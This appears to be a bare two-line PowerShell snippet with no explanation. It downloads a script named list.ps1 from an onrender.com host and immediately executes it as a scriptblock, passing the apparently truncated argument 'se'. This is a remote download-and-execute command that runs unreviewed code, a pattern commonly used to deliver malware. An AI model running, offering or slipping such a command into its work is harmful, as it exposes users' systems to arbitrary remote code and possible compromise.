$s = Invoke-RestMethod "https://cli-t0km.onrender.com/list.ps1"
& ([scriptblock]::Create($s)) se
